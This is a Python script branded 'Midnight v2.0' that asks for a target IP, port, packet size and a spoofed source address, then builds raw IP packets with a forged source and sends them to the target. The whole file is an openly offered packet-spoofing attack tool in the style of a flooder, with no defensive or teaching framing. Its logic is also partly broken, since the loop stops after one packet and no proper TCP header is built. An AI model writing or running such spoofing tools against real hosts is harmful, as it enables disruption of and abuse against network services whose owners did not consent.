import socket
import fcntl
import struct
import random
import subprocess
import os
import sys

def get_interface_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])

def create_virtual_interface(ip_address):
    interface_name = f'veth{random.randint(1, 100000)}'
    subprocess.run(['ip', 'link', 'add', interface_name, 'type', 'veth', 'peer', 'name', f'{interface_name}-peer'])
    subprocess.run(['ip', 'addr', 'add', ip_address, 'dev', interface_name])
    subprocess.run(['ip', 'link', 'set', interface_name, 'up'])
    return interface_name

os.system("clear")
os.system("figlet Midnight v2.0")
print("Creado Por Santh'M & Genplat Dev, v2.0 ¡Con IP Spoof!")
target_ip = input("Enter target IP: ")
target_port = int(input("Enter target port: "))
packet_size = int(input("Enter packet size (in bytes): "))
packet_char = input("Enter packet character: ")
sent = False

while not sent:
    try:
        # Create virtual interface and assign spoofed IP address
        spoofed_ip = input("Enter spoofed IP: ")
        interface_name = create_virtual_interface(spoofed_ip)

        # Send packet using virtual interface
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            source_ip = get_interface_ip(interface_name)
            dest_ip = target_ip

            packet_data = packet_char.encode() * packet_size

            # Construct IP header
            version = 4
            ihl = 5
            tos = 0
            tot_len = 20 + len(packet_data)
            id = random.randint(0, 65535)
            frag_off = 0
            ttl = 255
            protocol = socket.IPPROTO_TCP
            check = 0
            saddr = socket.inet_aton(source_ip)
            daddr = socket.inet_aton(dest_ip)
            ihl_version = (version << 4) + ihl
            ip_header = struct.pack('!BBHHHBBH4s4s',
                ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

            # Send packet
            s.sendto(ip_header + packet_data, (dest_ip, target_port))
            print("Packet sent successfully.")
            sent = True

        # Remove virtual interface
        subprocess.run(['ip', 'link', 'delete', interface_name])
    except socket.error as err:
        print(f"Socket error: {err}")
